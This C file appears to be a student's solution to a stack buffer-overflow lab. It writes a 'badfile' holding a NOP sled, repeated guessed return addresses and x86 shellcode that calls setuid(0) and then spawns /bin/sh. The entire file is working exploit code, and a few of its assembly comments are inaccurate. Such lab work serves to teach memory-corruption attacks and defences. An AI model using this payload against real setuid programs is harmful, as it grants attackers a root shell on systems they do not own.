//exploit.c
//A program that creates a file containing code for launching a shell

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
    
    "\x31\xc0" // Line 1: xorl %eax,%eax */
    "\x31\xdb" // Line 2: xorl %ebx,%ebx */
    "\xb0\xd5" // Line 3: movb $0xd5,%al */
    "\xcd\x80" // Line 4: int $0x80 */

    // ---- The code below is the same as the one in Task 1 ---

    "\x31\xc0"          // xor1 %eax,%eax
    "\x50"              // pushl %eax 
    "\x68""//sh"        // pushl $0x68732f2f
    "\x68""/bin"        // pushl $0x6e69622f
    "\x89\xe3"          // movel %esp, %ebp 
    "\x50"              // pushl %eax 
    "\x53"              // pushl %ebx 
    "\x89\xe1"          // movel %esp, %ecx 
    "\x99"
    "\xb0\x0b"          //movb $0x0b, %a1
    "\xcd\x80"          //int $0x80 
;


//gets the SP helper function
//not sure if entire correct but it works in this implementation
unsigned long get_sp(void)
{
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    memset(&buffer, 0x90, 517);
    
    // You need to fill the buffer with appropriate contents her
    char *bufptr; 
    long stackaddr, *addptr;

    //reference for placing shell code at the end of the buffer
    int bufend = sizeof(buffer) - (sizeof(shellcode));

    //Pointer to start address of the ebuffer
    bufptr = buffer;
    addptr = (long*)(bufptr);

    //set return address somewhere in the no-opsled
    // This offset value was determined to be 200 after testing and adjusting 
    stackaddr = get_sp()+200;

    //place return address an arbitrary number of times into the buffer 
    for (int i = 0; i < 10; i++)
      *(addptr++) = stackaddr;

    //Fill the end of buffer with shellcode
    for (int i = 0; i < sizeof(shellcode); i++) 
      buffer[bufend + i] = shellcode[i];
    
    //Save the contents to the file "badfile" 
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

